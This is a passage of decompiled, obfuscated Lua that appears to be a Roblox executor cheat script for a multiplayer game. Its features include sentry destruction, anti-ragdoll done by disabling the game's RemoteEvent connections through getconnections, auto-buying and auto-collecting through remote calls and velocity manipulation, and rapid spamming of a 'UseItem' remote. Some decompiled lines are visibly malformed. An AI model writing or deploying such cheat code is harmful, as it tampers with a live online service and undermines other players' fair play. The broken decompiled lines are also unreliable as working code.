                        v1234_, v1235_ = v1232_(v1233_, v1234_)
                        if v1234_ == nil then
                            break
                        end
                        if v1235_.Name:find("Sentry_") and not v1235_.Name:find(tostring(v1231_)) then
                            local v1236_ = v1235_:FindFirstChild("SetupFrame")
                            if v1236_ and v1236_:FindFirstChild("MainFrame") then
                                local v1237_ = v1236_.MainFrame:FindFirstChild("Time")
                                if v1237_ and v1237_.TextColor3 == Color3.fromRGB(255, 0, 0) then
                                    v1225_(v1236_)
                                    if v1235_:IsA("BasePart") then
                                        v1235_.CanCollide = false
                                        v1235_.Transparency = 1
                                        v1235_.CFrame = CFrame.new(v1229_.Position.X, v1229_.Position.Y + 1.5, v1229_.Position.Z)
                                    end
                                    local v1238_ = v1228_:FindFirstChildOfClass("Tool")
                                    if not v1238_ or v1238_.Name ~= "Bat" then
                                        if v1238_ then
                                            v1230_:UnequipTools()
                                        end
                                        local v1239_ = v1219_.Backpack:FindFirstChild("Bat")
                                        if v1239_ then
                                            v1230_:EquipTool(v1239_)
                                            task.wait(0.1)
                                            v1228_:FindFirstChild("Bat")
                                        end
                                    end
                                    while v1235_.Parent and (v1235_:IsDescendantOf(workspace) and _G.DestroySentry) do
                                        v1225_(v1236_)
                                        if v1235_:IsA("BasePart") then
                                            v1235_.CFrame = CFrame.new(v1229_.Position.X, v1229_.Position.Y + 1.5, v1229_.Position.Z)
                                            v1235_.CanCollide = false
                                            v1235_.Transparency = 1
                                        end
                                        local v1240_ = v1228_:FindFirstChildOfClass("Tool")
                                        if v1240_ and v1240_.Name == "Bat" then
                                            v1240_:Activate()
                                        else
                                            if v1240_ then
                                                v1230_:UnequipTools()
                                            end
                                            local v1241_ = v1219_.Backpack:FindFirstChild("Bat")
                                            if v1241_ then
                                                v1230_:EquipTool(v1241_)
                                                task.wait(0.1)
                                                local v1242_ = v1228_:FindFirstChild("Bat")
                                                if v1242_ then
                                                    v1242_:Activate()
                                                end
                                            end
                                        end
                                        task.wait(0.02)
                                        v1228_ = v1219_.Character
                                        if v1228_ then
                                            v1229_ = v1228_:FindFirstChild("HumanoidRootPart")
                                        else
                                            v1229_ = v1228_
                                        end
                                        if v1228_ then
                                            v1230_ = v1228_:FindFirstChild("Humanoid")
                                        else
                                            v1230_ = v1228_
                                        end
                                        if not (v1229_ and v1230_) then
                                            v1227_()
                                        end
                                    end
                                    if v1230_ then
                                        v1230_:UnequipTools()
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
        if v_u_1226_ then
            return
        end
    end
end)
task.spawn(function()
	-- block 52
    local v1243_ = game:GetService("Players")

    local v1244_, v1245_, v1246_ = ipairs(v1243_:GetPlayers())

    local v1247_ = v1243_.LocalPlayer.Character
    if v1247_ then
        local v1248_, v1249_, v1250_ = ipairs(v1247_:GetChildren())
        while true do
            local v1251_, v_u_1252_ = v1248_(v1249_, v1250_)
            if v1251_ == nil then
                break
            end
            v1250_ = v1251_
            if v_u_1252_:IsA("Accessory") or (v_u_1252_:IsA("LayeredClothing") or (v_u_1252_:IsA("Shirt") or (v_u_1252_:IsA("ShirtGraphic") or (v_u_1252_:IsA("Pants") or (v_u_1252_:IsA("BodyColors") or v_u_1252_:IsA("CharacterMesh")))))) then
                pcall(function()
					-- upvalues: (ref) v_u_1252_
                    v_u_1252_:Destroy()
                end)
            end
        end
    end
    local v1253_
    v1246_, v1253_ = v1244_(v1245_, v1246_)
    if v1246_ ~= nil then
        print(l2)
    end
    local v1254_, v1255_, v1256_ = ipairs(workspace:GetChildren())
    local v1257_
    v1256_, v1257_ = v1254_(v1255_, v1256_)
    if v1256_ ~= nil then
        if v1257_.Name:find("_Clone") then
            local v1258_, v1259_, v1260_ = ipairs(v1257_:GetChildren())
            while true do
                local v_u_1261_
                v1260_, v_u_1261_ = v1258_(v1259_, v1260_)
                if v1260_ == nil then
                    break
                end
                if v_u_1261_:IsA("Accessory") or (v_u_1261_:IsA("LayeredClothing") or (v_u_1261_:IsA("Shirt") or (v_u_1261_:IsA("ShirtGraphic") or (v_u_1261_:IsA("Pants") or (v_u_1261_:IsA("BodyColors") or v_u_1261_:IsA("CharacterMesh")))))) then
                    pcall(function()
						-- upvalues: (ref) v_u_1261_
                        v_u_1261_:Destroy()
                    end)
                end
            end
        end
        print(l25)
    end
    task.wait(0.1)
end)
task.spawn(function()
    local v1262_ = game:GetService("Players")
    local v1263_ = game:GetService("ReplicatedStorage")
    local v1264_ = v1262_.LocalPlayer
    local v_u_1265_ = v1263_:WaitForChild("Packages"):WaitForChild("Net"):WaitForChild("RF/CoinsShopService/RequestBuy")
    while true do
        while _G.FpsDev do
            local v1266_ = v1264_.Character
            local v1267_ = v1264_:FindFirstChild("Backpack")
            local v_u_1268_ = v1266_ and v1267_ and v1266_:FindFirstChildWhichIsA("Humanoid")
            if v_u_1268_ then
                local v1269_ = v_u_1268_:FindFirstChildOfClass("Tool")
                if not v1267_:FindFirstChild("Dark Matter Slap") and (not v1269_ or v1269_.Name ~= "Dark Matter Slap") then
                    pcall(function()
						-- upvalues: (ref) v_u_1265_
                        v_u_1265_:InvokeServer("Dark Matter Slap")
                    end)
                end
                if v1269_ and v1269_.Name ~= "Dark Matter Slap" then
                    pcall(function()
						-- upvalues: (ref) v_u_1268_
                        v_u_1268_:UnequipTools()
                    end)
                    task.wait(0.05)
                end
                local v_u_1270_ = v1267_:FindFirstChild("Dark Matter Slap")
                if not v_u_1270_ then
                    if v1269_ then
                        if v1269_.Name ~= "Dark Matter Slap" then
                            v_u_1270_ = false
                        else
                            v_u_1270_ = v1269_
                        end
                    else
                        v_u_1270_ = v1269_
                    end
                end
                if v_u_1270_ and v1269_ ~= v_u_1270_ then
                    pcall(function()
						-- upvalues: (ref) v_u_1268_, (ref) v_u_1270_
                        v_u_1268_:EquipTool(v_u_1270_)
                    end)
                end
            end
            task.wait(0.05)
        end
        task.wait(0.1)
    end
end)
task.spawn(function()
    local v_u_1271_ = game:GetService("ReplicatedStorage")
    local v1272_ = game:GetService("Players")
    local v1273_ = game:GetService("RunService")
    local v_u_1274_ = v1272_.LocalPlayer
    if not ControlTable then
        ControlTable = {}
    end
    local v_u_1275_ = {}
    local v_u_1276_ = nil
    local v_u_1277_ = {
        "useitem",
        "combatservice",
        "ragdoll"
    }
    local v_u_1278_ = false
    local v_u_1279_ = nil
    local v_u_1280_ = nil
    local v_u_1281_ = nil
    local v_u_1282_ = nil
    local v_u_1283_ = false
    local v_u_1284_ = nil
    local function v_u_1294_(p1285_)
		-- upvalues: (ref) v_u_1277_, (ref) v_u_1275_
        if getconnections then
            local v1286_, v1287_, v1288_ = ipairs(v_u_1277_)
            while true do
                local v1289_
                v1288_, v1289_ = v1286_(v1287_, v1288_)
                if v1288_ == nil then
                    break
                end
                if string.find(p1285_.Name:lower(), v1289_) then
                    if not v_u_1275_[p1285_] then
                        v_u_1275_[p1285_] = {}
                    end
                    local v1290_, v1291_, v1292_ = ipairs(getconnections(p1285_.OnClientEvent) or {})
                    while true do
                        local v1293_
                        v1292_, v1293_ = v1290_(v1291_, v1292_)
                        if v1292_ == nil then
                            break
                        end
                        if v1293_.Disable and not table.find(v_u_1275_[p1285_], v1293_) then
                            table.insert(v_u_1275_[p1285_], v1293_)
                            v1293_:Disable()
                        end
                    end
                end
            end
        end
    end
    local function v_u_1303_()
		-- upvalues: (ref) v_u_1275_
        if getconnections then
            local v1295_, v1296_, v1297_ = pairs(v_u_1275_)
            while true do
                local v1298_
                v1297_, v1298_ = v1295_(v1296_, v1297_)
                if v1297_ == nil then
                    break
                end
                local v1299_, v1300_, v1301_ = ipairs(v1298_)
                while true do
                    local v1302_
                    v1301_, v1302_ = v1299_(v1300_, v1301_)
                    if v1301_ == nil then
                        break
                    end
                    if v1302_.Enable then
                        v1302_:Enable()
                    end
                end
            end
            v_u_1275_ = {}
        end
    end
    local function v_u_1310_()
		-- upvalues: (ref) v_u_1271_, (ref) v_u_1294_, (ref) v_u_1276_
        if not ControlTable.AntiItem then
            ControlTable.AntiItem = true
            local v1304_ = v_u_1271_
            local v1305_, v1306_, v1307_ = ipairs(v1304_:GetDescendants())
            while true do
                local v1308_
                v1307_, v1308_ = v1305_(v1306_, v1307_)
                if v1307_ == nil then
                    break
                end
                if v1308_:IsA("RemoteEvent") then
                    v_u_1294_(v1308_)
                end
            end
            v_u_1276_ = v_u_1271_.DescendantAdded:Connect(function(p1309_)
				-- upvalues: (ref) v_u_1294_
                if ControlTable.AntiItem and p1309_:IsA("RemoteEvent") then
                    v_u_1294_(p1309_)
                end
            end)
        end
    end
    local function v_u_1311_()
		-- upvalues: (ref) v_u_1276_, (ref) v_u_1303_
        if ControlTable.AntiItem then
            ControlTable.AntiItem = false
            if v_u_1276_ then
                v_u_1276_:Disconnect()
                v_u_1276_ = nil
            end
            v_u_1303_()
        end
    end
    local function v_u_1313_()
		-- upvalues: (ref) v_u_1274_, (ref) v_u_1282_
        local v1312_ = v_u_1274_:WaitForChild("PlayerScripts")
        v_u_1282_ = require(v1312_:WaitForChild("PlayerModule")):GetControls()
        v_u_1282_:Enable()
    end
    local function v_u_1315_(p1314_)
		-- upvalues: (ref) v_u_1282_, (ref) v_u_1310_, (ref) v_u_1278_, (ref) v_u_1311_, (ref) v_u_1313_
        if p1314_ then
            v_u_1282_:Enable()
            v_u_1310_()
            v_u_1278_ = true
        else
            v_u_1311_()
            v_u_1313_()
            v_u_1278_ = false
        end
    end
    local function v_u_1317_()
		-- upvalues: (ref) v_u_1279_, (ref) v_u_1274_, (ref) v_u_1280_, (ref) v_u_1281_, (ref) v_u_1283_, (ref) v_u_1313_, (ref) v_u_1284_, (ref) v_u_1278_, (ref) v_u_1315_
        v_u_1279_ = v_u_1274_.Character or v_u_1274_.CharacterAdded:Wait()
        v_u_1280_ = v_u_1279_:WaitForChild("Humanoid")
        v_u_1281_ = v_u_1279_:WaitForChild("HumanoidRootPart")
        v_u_1283_ = false
        v_u_1313_()
        if v_u_1284_ then
            v_u_1284_:Disconnect()
        end
        v_u_1284_ = v_u_1280_.StateChanged:Connect(function(_, p1316_)
			-- upvalues: (ref) v_u_1283_
            if p1316_ ~= Enum.HumanoidStateType.Ragdoll then
                if p1316_ == Enum.HumanoidStateType.GettingUp or p1316_ == Enum.HumanoidStateType.Running then
                    v_u_1283_ = false
                end
            else
                v_u_1283_ = true
            end
        end)
        if v_u_1278_ then
            v_u_1315_(true)
        end
    end
    v_u_1317_()
    v_u_1274_.CharacterAdded:Connect(function()
		-- upvalues: (ref) v_u_1317_
        v_u_1317_()
    end)
    v1273_.Heartbeat:Connect(function()
		-- upvalues: (ref) v_u_1278_, (ref) v_u_1279_, (ref) v_u_1280_, (ref) v_u_1281_, (ref) v_u_1282_, (ref) v_u_1283_
        if v_u_1278_ and (ControlTable.AntiItem and (v_u_1279_ and (v_u_1280_ and v_u_1281_))) then
            pcall(function()
				-- upvalues: (ref) v_u_1282_
                v_u_1282_:Enable()
            end)
            if v_u_1283_ then
                local v1318_ = v_u_1280_.MoveDirection
                if v1318_.Magnitude <= 0 then
                    v_u_1281_.Velocity = Vector3.new(v_u_1281_.Velocity.X, v_u_1281_.Velocity.Y + 10, v_u_1281_.Velocity.Z)
                else
                    v_u_1281_.Velocity = Vector3.new(v1318_.X * 50, v_u_1281_.Velocity.Y + 10, v1318_.Z * 50)
                end
            end
        end
    end)
    local v1319_ = _G.AntiRag
    local v1320_ = v_u_1315_
    while task.wait(0.02) do
        if _G.AntiRag ~= v1319_ then
            v1319_ = _G.AntiRag
            v1320_(_G.AntiRag)
        end
    end
end)
local function v_u_1397_()
    if _G.PermUsar then
        task.spawn(function()
            _G.PermUsar = false
            local v1321_ = game:GetService("Players").LocalPlayer(v1321_.Character or v1321_.CharacterAdded:Wait()):WaitForChild("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
            local v1322_ = v1321_.CharacterAdded:Wait()
            local v1323_ = v1322_:WaitForChild("Humanoid")
            local v_u_1324_ = v1322_:WaitForChild("HumanoidRootPart")
            local v1325_ = v1321_:WaitForChild("PlayerScripts")
            local v1326_ = require(v1325_:WaitForChild("PlayerModule")):GetControls()
            v1326_:Disable()
            local v1327_ = workspace:WaitForChild("Plots")
            local v1328_, v1329_, v1330_ = ipairs(v1327_:GetChildren())
            local v1331_ = nil
            while true do
                local v1332_
                v1330_, v1332_ = v1328_(v1329_, v1330_)
                if v1330_ == nil then
                    v1332_ = v1331_
                end
                local v1333_, v1334_, v1335_ = ipairs(v1332_:GetDescendants())
                while true do
                    local v1336_
                    v1335_, v1336_ = v1333_(v1334_, v1335_)
                    if v1335_ == nil then
                        v1332_ = v1331_
                        break
                    end
                    if v1336_:IsA("TextLabel") and type(v1336_.Text) == "string" and v1336_.Text:find(v1321_.DisplayName) then
                        break
                    end
                end
                if v1332_ then
                    break
                end
                v1331_ = v1332_
            end
            if v1332_ then
                local v1337_, v1338_, v1339_ = ipairs(v1332_:GetDescendants())
                local v_u_1340_ = {}
                local v_u_1341_ = {}
                local v_u_1342_ = {}
                while true do
                    local v1343_, v1344_ = v1337_(v1338_, v1339_)
                    if v1343_ == nil then
                        break
                    end
                    v1339_ = v1343_
                    if v1344_:IsA("BasePart") then
                        local v1345_ = v1344_.Color
                        if math.floor(v1345_.R * 255) == 52 and (math.floor(v1345_.G * 255) == 142 and math.floor(v1345_.B * 255) == 64) then
                            local v1346_ = v1344_.Position.Y
                            if v1346_ < 6 then
                                table.insert(v_u_1342_, v1344_)
                            elseif v1346_ < 21 then
                                table.insert(v_u_1341_, v1344_)
                            else
                                table.insert(v_u_1340_, v1344_)
                            end
                        end
                    end
                end
                local v1347_ = _G
                local v1348_ = _G
                _G.Andar3 = v_u_1340_
                v1348_.Andar2 = v_u_1341_
                v1347_.Andar1 = v_u_1342_
                local v1349_ = v1332_:WaitForChild("DeliveryHitbox").Position
                if # v_u_1342_ > 0 then
                    local v_u_1350_ = {}
                    local v_u_1351_ = nil
                    local function v1360_()
						-- upvalues: (ref) v_u_1351_, (ref) v_u_1324_, (ref) v_u_1342_, (ref) v_u_1350_
                        local v1352_ = math.huge
                        local v1353_ = v_u_1351_ and v_u_1351_.Position or v_u_1324_.Position
                        local v1354_, v1355_, v1356_ = ipairs(v_u_1342_)
                        local v1357_ = nil
                        while true do
                            local v1358_
                            v1356_, v1358_ = v1354_(v1355_, v1356_)
                            if v1356_ == nil then
                                break
                            end
                            if not v_u_1350_[v1358_] then
                                local v1359_ = (v1358_.Position - v1353_).Magnitude
                                if v1359_ < v1352_ then
                                    v1357_ = v1358_
                                    v1352_ = v1359_
                                end
                            end
                        end
                        return v1357_
                    end
                    local v1361_ = v_u_1350_
                    while true do
                        local v1362_ = v1360_()
                        if not v1362_ then
                            break
                        end
                        v1361_[v1362_] = true
                        v_u_1351_ = v1362_
                        repeat
                            v_u_1324_.AssemblyLinearVelocity = (v1362_.Position - v_u_1324_.Position).Unit * 40
                            wait()
                        until (v_u_1324_.Position - v1362_.Position).Magnitude < 5 or (not v1323_ or v1323_.Health <= 0)
                        v_u_1324_.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                        wait()
                    end
                    repeat
                        v_u_1324_.AssemblyLinearVelocity = (v1349_ - v_u_1324_.Position).Unit * 40
                        wait()
                    until (v_u_1324_.Position - v1349_).Magnitude < 3 or (not v1323_ or v1323_.Health <= 0)
                    v_u_1324_.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                    if # v_u_1341_ > 0 then
                        local v1363_ = math.abs(v1349_.X - - 469)
                        local v1364_ = math.abs(v1349_.X - - 341)
                        local v1365_
                        if v1363_ < v1364_ then
                            v1365_ = Vector3.new(v1349_.X, v1349_.Y, v1349_.Z - 34)
                        else
                            v1365_ = Vector3.new(v1349_.X, v1349_.Y, v1349_.Z + 34)
                        end
                        repeat
                            v_u_1324_.AssemblyLinearVelocity = (v1365_ - v_u_1324_.Position).Unit * 40
                            wait()
                        until (v_u_1324_.Position - v1365_).Magnitude < 5 or (not v1323_ or v1323_.Health <= 0)
                        v_u_1324_.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                        local v1366_ = Vector3.new(v_u_1324_.Position.X, 15, v_u_1324_.Position.Z)
                        repeat
                            v_u_1324_.AssemblyLinearVelocity = (v1366_ - v_u_1324_.Position).Unit * 40
                            wait()
                        until math.abs(v_u_1324_.Position.Y - 15) < 2 or (not v1323_ or v1323_.Health <= 0)
                        v_u_1324_.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                        local v1367_
                        if v1363_ < v1364_ then
                            v1367_ = Vector3.new(- 519, v_u_1324_.Position.Y, v_u_1324_.Position.Z)
                        else
                            v1367_ = Vector3.new(- 297, v_u_1324_.Position.Y, v_u_1324_.Position.Z)
                        end
                        repeat
                            v_u_1324_.AssemblyLinearVelocity = (v1367_ - v_u_1324_.Position).Unit * 40
                            wait()
                        until math.abs(v_u_1324_.Position.X - v1367_.X) < 5 or (not v1323_ or v1323_.Health <= 0)
                        v_u_1324_.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                        local v1368_ = Vector3.new(v_u_1324_.Position.X, v_u_1324_.Position.Y, v1349_.Z)
                        repeat
                            v_u_1324_.AssemblyLinearVelocity = (v1368_ - v_u_1324_.Position).Unit * 40
                            wait()
                        until math.abs(v_u_1324_.Position.Z - v1349_.Z) < 5 or (not v1323_ or v1323_.Health <= 0)
                        v_u_1324_.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                        local v_u_1369_ = {}
                        local v_u_1370_ = nil
                        local function v1379_()
							-- upvalues: (ref) v_u_1370_, (ref) v_u_1324_, (ref) v_u_1341_, (ref) v_u_1369_
                            local v1371_ = math.huge
                            local v1372_ = v_u_1370_ and v_u_1370_.Position or v_u_1324_.Position
                            local v1373_, v1374_, v1375_ = ipairs(v_u_1341_)
                            local v1376_ = nil
                            while true do
                                local v1377_
                                v1375_, v1377_ = v1373_(v1374_, v1375_)
                                if v1375_ == nil then
                                    break
                                end
                                if not v_u_1369_[v1377_] then
                                    local v1378_ = (v1377_.Position - v1372_).Magnitude
                                    if v1378_ < v1371_ then
                                        v1376_ = v1377_
                                        v1371_ = v1378_
                                    end
                                end
                            end
                            return v1376_
                        end
                        local v1380_ = v_u_1369_
                        while true do
                            local v1381_ = v1379_()
                            if not v1381_ then
                                break
                            end
                            v1380_[v1381_] = true
                            v_u_1370_ = v1381_
                            repeat
                                v_u_1324_.AssemblyLinearVelocity = (v1381_.Position - v_u_1324_.Position).Unit * 40
                                wait()
                            until (v_u_1324_.Position - v1381_.Position).Magnitude < 5 or (not v1323_ or v1323_.Health <= 0)
                            v_u_1324_.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                            wait()
                        end
                    end
                    if # v_u_1340_ > 0 then
                        local v1382_
                        if math.abs(v1349_.X - - 469) >= math.abs(v1349_.X - - 341) then
                            v1382_ = Vector3.new(- 303, 14, v1349_.Z)
                        else
                            v1382_ = Vector3.new(- 517, 14, v1349_.Z)
                        end
                        repeat
                            v_u_1324_.AssemblyLinearVelocity = (v1382_ - v_u_1324_.Position).Unit * 40
                            wait()
                        until (v_u_1324_.Position - v1382_).Magnitude < 5 or (not v1323_ or v1323_.Health <= 0)
                        v_u_1324_.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                        local v1383_ = Vector3.new(v_u_1324_.Position.X, 35, v_u_1324_.Position.Z)
                        repeat
                            v_u_1324_.AssemblyLinearVelocity = (v1383_ - v_u_1324_.Position).Unit * 40
                            wait()
                        until math.abs(v_u_1324_.Position.Y - 35) < 2 or (not v1323_ or v1323_.Health <= 0)
                        v_u_1324_.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                        local v_u_1384_ = {}
                        local v_u_1385_ = nil
                        local function v1394_()
							-- upvalues: (ref) v_u_1385_, (ref) v_u_1324_, (ref) v_u_1340_, (ref) v_u_1384_
                            local v1386_ = math.huge
                            local v1387_ = v_u_1385_ and v_u_1385_.Position or v_u_1324_.Position
                            local v1388_, v1389_, v1390_ = ipairs(v_u_1340_)
                            local v1391_ = nil
                            while true do
                                local v1392_
                                v1390_, v1392_ = v1388_(v1389_, v1390_)
                                if v1390_ == nil then
                                    break
                                end
                                if not v_u_1384_[v1392_] then
                                    local v1393_ = (v1392_.Position - v1387_).Magnitude
                                    if v1393_ < v1386_ then
                                        v1391_ = v1392_
                                        v1386_ = v1393_
                                    end
                                end
                            end
                            return v1391_
                        end
                        local v1395_ = v_u_1384_
                        while true do
                            local v1396_ = v1394_()
                            if not v1396_ then
                                break
                            end
                            v1395_[v1396_] = true
                            v_u_1385_ = v1396_
                            repeat
                                v_u_1324_.AssemblyLinearVelocity = (v1396_.Position - v_u_1324_.Position).Unit * 40
                                wait()
                            until (v_u_1324_.Position - v1396_.Position).Magnitude < 5 or (not v1323_ or v1323_.Health <= 0)
                            v_u_1324_.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                            wait()
                        end
                    end
                    v_u_1324_.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                    v1326_:Enable()
                    task.wait(_G.DelayCollect)
                    _G.PermUsar = true
                end
            end
        end)
    end
end
task.spawn(function()
	-- upvalues: (ref) v_u_1397_
    while true do
        repeat
            task.wait(0.05)
        until _G.PermUsar and _G.AutoCollect
        v_u_1397_()
    end
end)
task.spawn(function()
    local v_u_1398_ = game:GetService("RunService")
    local v_u_1399_ = game:GetService("Workspace")
    local v1400_ = game:GetService("Players")
    local v_u_1401_ = game:GetService("ReplicatedStorage")
    local v_u_1402_ = v1400_.LocalPlayer
    local v_u_1403_ = nil
    local v_u_1404_ = nil
    local v_u_1405_ = nil
    if not ControlTable then
        ControlTable = {}
    end
    local v_u_1406_ = {}
    local v_u_1407_ = nil
    local v_u_1408_ = {
        "useitem",
        "combatservice",
        "ragdoll"
    }
    local v_u_1409_ = nil
    local v_u_1410_ = nil
    local v_u_1411_ = false
    local v_u_1412_ = nil
    local v_u_1413_ = nil
    local v_u_1414_ = v_u_1402_:WaitForChild("PlayerScripts")
    local v_u_1415_ = nil
    local v_u_1416_ = "IDLE"
    local v_u_1417_ = nil
    local v_u_1418_ = nil
    local v_u_1419_ = nil
    local function v_u_1425_(p1420_)
        local v1421_, v1422_ = p1420_:match("[$]([%d,%.]+)([KMB]?)/s")
        if not v1421_ then
            return 0
        end
        local v1423_ = v1421_:gsub(",", "")
        local v1424_ = tonumber(v1423_)
        if not v1424_ then
            return 0
        end
        if v1422_ == "K" then
            v1424_ = v1424_ * 1000
        elseif v1422_ == "M" then
            v1424_ = v1424_ * 1000000
        elseif v1422_ == "B" then
            v1424_ = v1424_ * 1000000000
        end
        return v1424_
    end
    local function v_u_1437_()
		-- upvalues: (ref) v_u_1399_, (ref) v_u_1425_, (ref) v_u_1405_, (ref) v_u_1404_, (ref) v_u_1403_
        local v1426_ = v_u_1399_
        local v1427_, v1428_, v1429_ = ipairs(v1426_:GetChildren())
        local v_u_1430_ = - 1
        local v_u_1431_ = nil
        local v_u_1432_ = nil
        while true do
            local v_u_1433_
            v1429_, v_u_1433_ = v1427_(v1428_, v1429_)
            if v1429_ == nil then
                break
            end
            local _, _ = pcall(function()
				-- upvalues: (ref) v_u_1433_, (ref) v_u_1425_, (ref) v_u_1430_, (ref) v_u_1431_, (ref) v_u_1432_
                if string.len(v_u_1433_.Name) > 15 then
                    local v1434_ = v_u_1433_:FindFirstChild("Part")
                    if v1434_ and v1434_:IsA("BasePart") then
                        local v1435_ = v1434_:FindFirstChild("Info") and v1434_.Info:FindFirstChild("AnimalOverhead")
                        if v1435_ then
                            v1435_ = v1434_.Info.AnimalOverhead:FindFirstChild("Generation")
                        end
                        if v1435_ and v1435_:IsA("TextLabel") then
                            local v1436_ = v_u_1425_(v1435_.Text)
                            if _G.AutobuyMin <= v1436_ and v_u_1430_ < v1436_ then
                                v_u_1430_ = v1436_
                                v_u_1431_ = v_u_1433_
                                v_u_1432_ = v1434_
                            end
                        end
                    end
                end
            end)
        end
        if v_u_1431_ then
            if v_u_1431_ ~= v_u_1405_ then
                v_u_1405_ = v_u_1431_
                v_u_1404_ = v_u_1431_
                v_u_1403_ = v_u_1432_.Position
            else
                v_u_1403_ = v_u_1432_.Position
            end
        else
            v_u_1405_ = nil
            v_u_1404_ = nil
            v_u_1403_ = nil
        end
    end
    local function v_u_1447_(p1438_)
		-- upvalues: (ref) v_u_1408_, (ref) v_u_1406_
        if getconnections then
            local v1439_, v1440_, v1441_ = ipairs(v_u_1408_)
            while true do
                local v1442_
                v1441_, v1442_ = v1439_(v1440_, v1441_)
                if v1441_ == nil then
                    break
                end
                if string.find(p1438_.Name:lower(), v1442_) then
                    if not v_u_1406_[p1438_] then
                        v_u_1406_[p1438_] = {}
                    end
                    local v1443_, v1444_, v1445_ = ipairs(getconnections(p1438_.OnClientEvent) or {})
                    while true do
                        local v1446_
                        v1445_, v1446_ = v1443_(v1444_, v1445_)
                        if v1445_ == nil then
                            break
                        end
                        if v1446_.Disable and not table.find(v_u_1406_[p1438_], v1446_) then
                            table.insert(v_u_1406_[p1438_], v1446_)
                            v1446_:Disable()
                        end
                    end
                end
            end
        end
    end
    local function v_u_1456_()
		-- upvalues: (ref) v_u_1406_
        if getconnections then
            local v1448_, v1449_, v1450_ = pairs(v_u_1406_)
            while true do
                local v1451_
                v1450_, v1451_ = v1448_(v1449_, v1450_)
                if v1450_ == nil then
                    break
                end
                local v1452_, v1453_, v1454_ = ipairs(v1451_)
                while true do
                    local v1455_
                    v1454_, v1455_ = v1452_(v1453_, v1454_)
                    if v1454_ == nil then
                        break
                    end
                    if v1455_.Enable then
                        v1455_:Enable()
                    end
                end
            end
            v_u_1406_ = {}
        end
    end
    local function v_u_1463_()
		-- upvalues: (ref) v_u_1401_, (ref) v_u_1447_, (ref) v_u_1407_
        if not ControlTable.AntiItem then
            ControlTable.AntiItem = true
            local v1457_ = v_u_1401_
            local v1458_, v1459_, v1460_ = ipairs(v1457_:GetDescendants())
            while true do
                local v1461_
                v1460_, v1461_ = v1458_(v1459_, v1460_)
                if v1460_ == nil then
                    break
                end
                if v1461_:IsA("RemoteEvent") then
                    v_u_1447_(v1461_)
                end
            end
            v_u_1407_ = v_u_1401_.DescendantAdded:Connect(function(p1462_)
				-- upvalues: (ref) v_u_1447_
                if ControlTable.AntiItem and p1462_:IsA("RemoteEvent") then
                    v_u_1447_(p1462_)
                end
            end)
        end
    end
    local function v_u_1464_()
		-- upvalues: (ref) v_u_1407_, (ref) v_u_1456_
        if ControlTable.AntiItem then
            ControlTable.AntiItem = false
            if v_u_1407_ then
                v_u_1407_:Disconnect()
                v_u_1407_ = nil
            end
            v_u_1456_()
        end
    end
    local function v_u_1468_()
		-- upvalues: (ref) v_u_1414_, (ref) v_u_1413_
        local v1466_, v1467_ = pcall(function()
			-- upvalues: (ref) v_u_1414_
            local v1465_ = v_u_1414_
            return require(v1465_:WaitForChild("PlayerModule"))
        end)
        if v1466_ then
            v_u_1413_ = v1467_:GetControls()
            v_u_1413_:Enable()
        end
    end
    local function v_u_1474_()
		-- upvalues: (ref) v_u_1402_, (ref) v_u_1412_, (ref) v_u_1413_, (ref) v_u_1414_, (ref) v_u_1415_
        local v1469_ = v_u_1402_.Character
        if not (v1469_ and v1469_.Parent) then
            v_u_1412_ = nil
            return nil, nil, nil
        end
        v_u_1412_ = v1469_:WaitForChild("HumanoidRootPart")
        local v1470_ = v1469_:FindFirstChildOfClass("Humanoid")
        if not v_u_1413_ then
            local v1472_, v1473_ = pcall(function()
				-- upvalues: (ref) v_u_1414_
                local v1471_ = v_u_1414_
                return require(v1471_:WaitForChild("PlayerModule"))
            end)
            if v1472_ then
                v_u_1415_ = v1473_
                v_u_1413_ = v_u_1415_:GetControls()
            end
        end
        return v1469_, v_u_1412_, v1470_
    end
    local function v_u_1480_()
		-- upvalues: (ref) v_u_1409_, (ref) v_u_1411_, (ref) v_u_1474_, (ref) v_u_1402_
        if not v_u_1409_ then
            v_u_1409_ = task.spawn(function()
				-- upvalues: (ref) v_u_1411_, (ref) v_u_1474_, (ref) v_u_1402_, (ref) v_u_1409_
                while v_u_1411_ do
                    local v1475_, v1476_, v_u_1477_ = v_u_1474_()
                    if v1475_ and (v1476_ and v_u_1477_) then
                        local v1478_ = v_u_1402_:FindFirstChild("Backpack")
                        local v_u_1479_ = v1478_ and (not v1475_:FindFirstChild("Grapple Hook") and v1478_:FindFirstChild("Grapple Hook"))
                        if v_u_1479_ then
                            pcall(function()
								-- upvalues: (ref) v_u_1477_, (ref) v_u_1479_
                                v_u_1477_:EquipTool(v_u_1479_)
                            end)
                        end
                    end
                    task.wait(0.002)
                end
                v_u_1409_ = nil
            end)
        end
    end
    local function v_u_1482_()
		-- upvalues: (ref) v_u_1410_, (ref) v_u_1411_, (ref) v_u_1401_
        if not v_u_1410_ then
            v_u_1410_ = task.spawn(function()
				-- upvalues: (ref) v_u_1411_, (ref) v_u_1401_, (ref) v_u_1410_
                while v_u_1411_ do
                    pcall(function()
						-- upvalues: (ref) v_u_1401_
                        local v1481_ = v_u_1401_:FindFirstChild("Packages")
                        if v1481_ then
                            require(v1481_:WaitForChild("Net")):RemoteEvent("UseItem"):FireServer(1.9832406361897787)
                        end
                    end)
                    task.wait(0.01)
                end
                v_u_1410_ = nil
            end)
        end
    end
    local function v1483_(_)
		-- upvalues: (ref) v_u_1474_
        v_u_1474_()
    end
    v_u_1402_.CharacterAdded:Connect(v1483_)
    if v_u_1402_.Character then
        v_u_1474_()
    end
    local v_u_1484_ = 0
    local v_u_1485_ = 0.5
    local function v_u_1492_()
		-- upvalues: (ref) v_u_1419_, (ref) v_u_1398_, (ref) v_u_1411_, (ref) v_u_1404_, (ref) v_u_1474_, (ref) v_u_1403_, (ref) v_u_1484_, (ref) v_u_1485_
